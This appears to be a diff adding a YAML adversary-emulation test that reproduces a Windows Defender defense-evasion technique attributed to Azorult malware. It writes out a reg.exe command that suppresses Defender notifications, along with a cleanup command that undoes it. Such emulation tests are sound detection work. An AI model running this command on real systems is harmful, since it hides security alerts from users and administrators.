@@ -1,0 +1,23 @@
+api_version: "2.0"
+name: Suppress Win Defender Notifications
+description: |
+    Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.
+    See how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/
+uuid: c30dada3-7777-4590-b970-dc890b8cf113
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1112: Modify Registry'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: suppress-win-defender-notifications
+      inline: |
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /t REG_DWORD /d 1 /f
+      executor: command_prompt
+      cleanup:
+        inline: |
+            reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\UX Configuration" /v Notification_Suppress /f >nul 2>&1
+        executor: command_prompt
